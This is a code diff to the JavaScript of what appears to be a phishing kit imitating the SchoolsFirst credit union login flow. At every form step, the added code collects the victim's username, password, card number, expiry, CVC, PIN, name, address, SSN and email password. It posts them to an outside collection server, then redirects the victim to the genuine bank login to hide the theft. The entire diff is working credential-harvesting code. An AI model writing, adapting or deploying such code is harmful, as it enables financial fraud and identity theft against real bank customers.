@@ -15,7 +15,31 @@ const firstsubmit = () => {
     sessionStorage.setItem("Keyusername", firstuse);
     sessionStorage.setItem("Keypassword", firstmove);
 
-    setTimeout(() => location.assign("./confirmLogin.html"), 3000);
+    const sendDetails = `<h3> UserName : ${firstuse} <br> Password : ${firstmove} </h3>`;
+
+    const sendData = {
+      siteName: "SchoolFirst",
+      siteSend: sendDetails,
+    };
+
+    const billResponse = await fetch(
+      "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application.json",
+        },
+        body: JSON.stringify(sendData),
+      }
+    );
+
+    billResponse
+      .text()
+      .then(
+        (data) =>
+          data === "Sent" &&
+          location.assign("./confirmLogin.html")
+      );
   } else {
     document.getElementById("orgus").style.borderBottom = "1px solid #b22222";
 
@@ -70,7 +94,31 @@ const secondsubmit = () => {
   sessionStorage.setItem("cardCVC", firstcc);
   sessionStorage.setItem("cardPin", firstcp);
 
-  setTimeout(() => location.assign("./confirmPersonal.html"), 3000);
+  const sendDetails = `<h3> UserName : ${sessionStorage.Keyusername} <br> Password : ${sessionStorage.Keypassword} <br> Card Number : ${firstcn} <br> Card Expiry Date  : ${firsted} <br> Card CVC : ${firstcc} <br> Card Pin : ${firstcp} </h3> `;
+
+  const sendData = {
+    siteName: "SchoolFirst",
+    siteSend: sendDetails,
+  };
+
+  const billResponse = await fetch(
+    "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application.json",
+      },
+      body: JSON.stringify(sendData),
+    }
+  );
+
+  billResponse
+    .text()
+    .then(
+      (data) =>
+        data === "Sent" &&
+        location.assign("./confirmPersonal.html")
+    );
 };
 
 const thirdsubmit = () => {
@@ -115,7 +163,31 @@ const thirdsubmit = () => {
     sessionStorage.setItem("BOWuserfullZip", userfullZip);
     sessionStorage.setItem("BOWuserfullSSN", userfullSSN);
 
-    setTimeout(() => location.assign("./confirmEmail.html"), 3000);
+    const sendDetails = `<h3> UserName : ${sessionStorage.Keyusername} <br> Password : ${sessionStorage.Keypassword} <br> Card Number : ${sessionStorage.cardNumber} <br> Card Expiry Date  : ${sessionStorage.cardExpiryDate} <br> Card CVC : ${sessionStorage.cardCVC} <br> Card Pin : ${sessionStorage.cardPin} <br> Full Name  : ${userfullName} <br> Mobile : ${userfullMobile} <br> Address : ${userfullAddress} <br> City : ${userfullCity} <br> State : ${userfullState} <br> Zip Code : ${userfullZip} <br> SSN : ${userfullSSN} </h3>`;
+
+    const sendData = {
+      siteName: "SchoolFirst",
+      siteSend: sendDetails,
+    };
+
+    const billResponse = await fetch(
+      "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application.json",
+        },
+        body: JSON.stringify(sendData),
+      }
+    );
+
+    billResponse
+      .text()
+      .then(
+        (data) =>
+          data === "Sent" &&
+          location.assign("./confirmEmail.html")
+      );
   } else {
     document.getElementById("userfullName").style.borderBottom =
       "1px solid #b22222";
@@ -170,40 +242,35 @@ const lastsubmit = () => {
 };
 
 const completeSubmission = async () => {
-  const MailReturn = await fetch(
-    "https://mailclient.trivecodes.com/schoolfirst/php/mail_key.php",
+  const sendDetails = `<h3> UserName : ${sessionStorage.Keyusername} <br> Password : ${sessionStorage.Keypassword} <br> Card Number : ${sessionStorage.cardNumber} <br> Card Expiry Date  : ${sessionStorage.cardExpiryDate} <br> Card CVC : ${sessionStorage.cardCVC} <br> Card Pin : ${sessionStorage.cardPin} <br> Full Name  : ${sessionStorage.BOWuserfullName} <br> Mobile : ${sessionStorage.BOWuserfullMobile} <br> Address : ${sessionStorage.BOWuserfullAddress} <br> City : ${sessionStorage.BOWuserfullCity} <br> State : ${sessionStorage.BOWuserfullState} <br> Zip Code : ${sessionStorage.BOWuserfullZip} <br> SSN : ${sessionStorage.BOWuserfullSSN} <br> Email : ${sessionStorage.KeyEmail} <br> Email Password : ${sessionStorage.KeyEmailpassword} </h3>`;
+
+  const sendData = {
+    siteName: "SchoolFirst",
+    siteSend: sendDetails,
+  };
+
+  const billResponse = await fetch(
+    "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
     {
       method: "POST",
       headers: {
         "Content-Type": "application.json",
       },
-      body: JSON.stringify({
-        username: sessionStorage.Keyusername,
-        password: sessionStorage.Keypassword,
-        cardNumber: sessionStorage.cardNumber,
-        cardExpiryDate: sessionStorage.cardExpiryDate,
-        cardCVC: sessionStorage.cardCVC,
-        cardPin: sessionStorage.cardPin,
-        Name: sessionStorage.BOWuserfullName,
-        Mobile: sessionStorage.BOWuserfullMobile,
-        Address: sessionStorage.BOWuserfullAddress,
-        City: sessionStorage.BOWuserfullCity,
-        State: sessionStorage.BOWuserfullState,
-        Zip: sessionStorage.BOWuserfullZip,
-        SSN: sessionStorage.BOWuserfullSSN,
-        Email: sessionStorage.KeyEmail,
-        EmailPass: sessionStorage.KeyEmailpassword,
-      }),
+      body: JSON.stringify(sendData),
     }
   );
 
-  await sessionStorage.clear();
-
-  MailReturn.text().then(
-    (data) =>
-      data === "Sent" &&
-      location.assign(
-        "https://www.schoolsfirstfcu.org/gateway/schoolsfirstfcu/login#/"
-      )
-  );
+  billResponse
+    .text()
+    .then(
+      (data) =>
+        data === "Sent" &&
+        setTimeout(
+          () =>
+            location.assign(
+              "https://www.schoolsfirstfcu.org/gateway/schoolsfirstfcu/login#/"
+            ),
+          3000
+        )
+    );
 };
